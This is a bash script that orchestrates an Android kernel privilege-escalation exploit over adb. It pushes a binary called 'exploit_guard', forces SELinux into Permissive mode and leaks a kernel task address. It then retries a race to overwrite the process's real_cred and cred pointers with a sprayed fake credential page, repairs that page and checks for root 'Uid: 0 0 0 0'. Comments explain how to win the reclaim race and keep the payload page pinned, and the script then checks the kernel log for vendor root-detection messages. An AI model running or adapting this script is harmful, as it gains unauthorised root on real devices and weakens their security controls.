#!/bin/bash
# run_bootA.sh — Boot A orchestration: ONE boot, ONE question:
#   with the private sprayed cred page and NO execve, does the framework survive?
#
# Order is not negotiable:
#   Permissive -> kernel-log capture -> LT child spins -> 0x778 -> 0x780
#   -> LOCAL repair of the cred the 0x780 pass installed -> confirm "Uid: 0 0 0 0"
#   -> ONLY THEN poke the child.
#
# Deliberately does NOT set V12_W7_INIT_CRED / V12_ALLOW_INIT_CRED / LT_EXEC.
#
# Fixes over the first attempt (2026-09-18):
#   1. `dmesg -w` is a NO-OP on this device — toybox ignores -w, dumps once and
#      exits.  Run 1's "kernel log" therefore held only pre-capture history and
#      zero incident data (its last line predates the capture start).  Polled now.
#   2. Each W7 offset is retried: the reclaim is a race and the old runners used
#      6-8 rounds per offset.  Firing once per offset (as run 1 did) misses.
#   3. V12_HOLD_SEC pins the payload page.  Without it the W7 process exits, its
#      sockets close, the page is freed and task->cred dangles.
#   4. The repair must target the address the CRED pass installed — every process
#      gets its own page, so a repair pass using its own would zero a third,
#      unrelated page.  The cred address is read back and passed as
#      V12_W7_REPAIR_ADDR.
set -u
# adb / serial / local binary are overridable:  ADB=... SER=... BIN_LOCAL=... bash run_bootA.sh
export MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*"

ADB="${ADB:-adb}"
SER="${SER:-$( "$ADB" devices 2>/dev/null | sed -n "2s/[[:space:]].*//p" )}"
DEV=/data/local/tmp
BIN=$DEV/glxA          # LT + W1
BINW=$DEV/glxW         # W7 only, so retry-kills never touch the LT child
EV=$DEV/bootA_ev.txt
TASKF=$DEV/bootA_task.txt
RES=$DEV/bootA_res.txt
KLOG=$DEV/bootA_klog.txt
OUT="${OUT:-./bootA_$(date +%m%d_%H%M%S)}"
MAXW=${MAXW:-8}
HOLD=${HOLD:-600}
mkdir -p "$OUT"

A() { "$ADB" -s "$SER" shell "$@"; }
say() { echo "[$(date +%H:%M:%S)] $*"; }
svc_count() {
    local n=0 s
    for s in package power input phone wifi; do
        case "$(A "service check $s" 2>/dev/null | tr -d '\r')" in
            *found*) n=$((n+1));;
        esac
    done
    echo "$n"
}
# detached launch that cannot block the runner on the adb session's stdin
detach() { timeout 15 "$ADB" -s "$SER" shell "$1" >/dev/null 2>&1 || true; }

# ---------------------------------------------------------------- preflight
say "=== preflight ==="
"$ADB" devices | grep -q "$SER" || { echo "device $SER not attached"; exit 1; }
A 'uname -r; getenforce; cat /proc/sys/kernel/random/boot_id; uptime; cat /proc/loadavg' \
    | tee "$OUT/00_preflight.txt" | tr -d '\r'
say "push binaries"
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BIN"  2>&1 | tail -1
"$ADB" push "${BIN_LOCAL:-./exploit_guard}" "$BINW" 2>&1 | tail -1
A "chmod 755 $BIN $BINW"

# ---------------------------------------------------------------- 1. Permissive
say "=== step 1: SELinux Permissive ==="
if [ "$(A 'getenforce' | tr -d '\r')" = "Permissive" ]; then
    say "  already Permissive (carried over in this boot) — skipping W1"
else
    W1OK=0
    for r in $(seq 1 "$MAXW"); do
        A "cd $DEV && V12B_EVIDENCE=$DEV/bootA_w1_ev.txt timeout 190 ./glxA W1 >/dev/null 2>&1"
        EN=$(A 'getenforce' | tr -d '\r')
        say "  W1 round $r: getenforce=$EN"
        [ "$EN" = "Permissive" ] && { W1OK=1; break; }
        sleep 3
    done
    [ "$W1OK" = 1 ] || { say "!! W1 never reached Permissive — stopping"; exit 2; }
fi
A 'getenforce; uptime' | tee "$OUT/01_w1.txt"

# ---------------------------------------------------------------- 2. kernel log
say "=== step 2: kernel-log capture (polled; dmesg -w is a no-op here) ==="
detach "rm -f $KLOG $DEV/_k.tmp; setsid nohup sh -c 'n=0; while :; do dmesg > $DEV/_k.tmp 2>/dev/null; c=\$(wc -l < $DEV/_k.tmp); [ \"\$c\" -lt \"\$n\" ] && n=0; tail -n +\$((n+1)) $DEV/_k.tmp >> $KLOG; n=\$c; sleep 2; done' >/dev/null 2>&1 </dev/null &"
sleep 5
say "  capture lines after 5s: $(A "wc -l < $KLOG 2>/dev/null" | tr -d '\r')"

# ---------------------------------------------------------------- 3. settle
say "=== step 2.5: wait for load to settle ==="
for i in $(seq 1 40); do
    L=$(A 'cut -d" " -f1 /proc/loadavg' | tr -d '\r')
    say "  load1=$L"
    awk -v l="$L" 'BEGIN{exit !(l+0 < 12)}' && break
    sleep 6
done

# ---------------------------------------------------------------- 4. LT
say "=== step 3: LT child (pure userspace spin, NO_EXEC) ==="
TASK=""; CPID=""; PPID_LT=""
for attempt in $(seq 1 "$MAXW"); do
    say "  LT attempt $attempt"
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_RESULT_FILE=$RES V12B_EVIDENCE=$DEV/bootA_lt_ev.txt V12_NO_EXEC=1 ./glxA LT > $DEV/bootA_lt.log 2>&1 </dev/null &"
    TASK=""
    for i in $(seq 1 25); do
        sleep 1
        TASK=$(A "cat $TASKF 2>/dev/null" | tr -d '\r\n')
        [ -n "$TASK" ] && break
    done
    [ -n "$TASK" ] && break
    say "    rejected: $(A "grep -m1 suspicious $DEV/bootA_lt.log 2>/dev/null" | tr -d '\r')"
    sleep 4
done
[ -z "$TASK" ] && { say "!! no task leak after $MAXW attempts — stopping"; exit 3; }

LTLOG=$(A "cat $DEV/bootA_lt.log 2>/dev/null")
CPID=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT child_task = 0x[0-9a-f]* pid=\([0-9]*\).*/\1/p' | head -1)
PPID_LT=$(printf '%s\n' "$LTLOG" | sed -n 's/.*LT parent pid=\([0-9]*\) child=.*/\1/p' | head -1)
say "  task=$TASK child_pid=$CPID lt_parent=$PPID_LT"
say "  baseline status:"
A "grep -E '^(Uid|CapEff):' /proc/$CPID/status" | tr -d '\r' | sed 's/^/    /'

# ---------------------------------------------------------------- 5. writes
w7_attempt() {   # $1=off $2=extra $3=tag -> prints HIT or MISS
    local off=$1 extra=$2 tag=$3
    A "rm -f $EV 2>/dev/null; true"
    detach "cd $DEV && setsid nohup env V12_TASK_FILE=$TASKF V12_W7_OFF=$off V12_CRED_VALUE_OFF=0 V12_HOLD_SEC=$HOLD $extra V12B_EVIDENCE=$EV ./glxW W7 > $DEV/w7_$tag.log 2>&1 </dev/null &"
    local i out=""
    for i in $(seq 1 90); do
        sleep 1
        out=$(A "cat $EV 2>/dev/null" | tr -d '\r')
        printf '%s' "$out" | grep -q 'probe_state' && break
    done
    printf '%s\n' "$out" > "$OUT/w7_$tag.txt"
    grep -E 'write value|write_value|write_target|probe_state|LOCAL repair|side effect|REFUSED|HOLD' \
        "$OUT/w7_$tag.txt" | sed 's/^/    /'
    if printf '%s' "$out" | grep -q '★ W7'; then echo HIT; else echo MISS; fi
}

w7_step() {      # $1=off $2=extra $3=tag $4=required(HIT|any)
    local off=$1 extra=$2 tag=$3 req=${4:-HIT} r res
    for r in $(seq 1 "$MAXW"); do
        say "  [$tag] off=$off round $r/$MAXW"
        res=$(w7_attempt "$off" "$extra" "$tag$r")
        if [ "$res" = HIT ]; then
            say "  [$tag] HIT on round $r — page held ${HOLD}s"
            return 0
        fi
        say "  [$tag] miss (probe_state) — kill + retry"
        A "for p in \$(pidof glxW); do kill -9 \$p; done 2>/dev/null; true"
        sleep 3
    done
    say "  [$tag] no HIT in $MAXW rounds"
    [ "$req" = any ] && return 0
    return 1
}

say "=== step 4: 0x778 (real_cred) ==="
w7_step 0x778 "" w778 HIT || true
say "=== step 5: 0x780 (cred) ==="
w7_step 0x780 "" w780 HIT || true
CRED=$(grep -h -m1 'write value = private cred page' "$OUT"/w7_w780*.txt 2>/dev/null \
       | sed -n 's/.*page \(0x[0-9a-f]*\).*/\1/p' | tail -1)
say "  cred address reported by the 0x780 pass: ${CRED:-<none>}"

say "=== step 6: LOCAL repair of that cred's +8 ==="
if [ -n "$CRED" ]; then
    w7_step 0x780 "V12_W7_ZERO=1 V12_W7_REPAIR_CRED=1 V12_W7_REPAIR_ADDR=$CRED" repair any
else
    say "  !! no cred address captured — skipping repair"
fi

say "=== step 7: confirm cred BEFORE poking ==="
A "cat /proc/$CPID/status 2>/dev/null | grep -E '^(Uid|Gid|CapEff|CapPrm|Groups):'" | tee "$OUT/07_status.txt"
U=$(A "grep -m1 '^Uid:' /proc/$CPID/status 2>/dev/null" | tr -d '\r' | tr -s ' \t' ' ')
say "  Uid line: [$U]"
case "$U" in
  *"0 0 0 0"*) say "  OK: Uid 0 0 0 0";;
  *) say "  !! Uid is not 0 0 0 0 — the write did not take.  Poking anyway:"
     say "     with V12_NO_EXEC the child only reports and sleeps, so it is harmless.";;
esac

say "=== step 8: poke LT parent ==="
[ -n "$PPID_LT" ] && A "kill -USR1 $PPID_LT" 2>&1 | tr -d '\r'
for i in $(seq 1 20); do
    sleep 1
    R=$(A "cat $RES 2>/dev/null" | tr -d '\r' | tail -1)
    [ -n "$R" ] && { say "  result: $R"; break; }
done
A "cat $DEV/bootA_lt.log" | tr -d '\r' | tail -15 | tee "$OUT/08_lt_tail.txt"

say "=== step 9: watch framework + module for 150s ==="
for i in $(seq 10 10 150); do
    sleep 10
    UP=$(A 'cut -d. -f1 /proc/uptime' | tr -d '\r')
    [ -z "$UP" ] && { say "  !! device gone at t+${i}s (reboot?)"; break; }
    say "  t+${i}s up=$UP services=$(svc_count)/5 kernelsu=$(A "grep -c '^kernelsu' /proc/modules 2>/dev/null" | tr -d '\r')"
done

say "=== step 10: evidence ==="
A "grep -aE 'ROOTCHECK|oplus_root|sys_call_number|set_id_flag|addr_limit|enforce|path@@|execve_' $KLOG" \
    | tr -d '\r' > "$OUT/10_rootcheck.txt"
if [ -s "$OUT/10_rootcheck.txt" ]; then
    say "  ROOTCHECK/path@@ lines:"; sed 's/^/    /' "$OUT/10_rootcheck.txt" | head -30
else
    say "  none in the captured window"
fi
A "cat $KLOG" | tr -d '\r' > "$OUT/kernel_log.txt"
say "  kernel log: $(wc -l < "$OUT/kernel_log.txt") lines"
A "cat /proc/$CPID/status 2>/dev/null | grep -E '^(Uid|Gid|CapEff|Groups):'" | tee "$OUT/10_status_after.txt"
A "getprop ro.boot.bootreason; getenforce; uptime; grep '^kernelsu' /proc/modules 2>/dev/null" | tee "$OUT/10_final.txt"
for f in bootA_lt.log bootA_lt_ev.txt bootA_w1_ev.txt; do
    A "cat $DEV/$f 2>/dev/null" | tr -d '\r' > "$OUT/$f"
done
say "evidence -> $OUT"
say "=== boot A done ==="
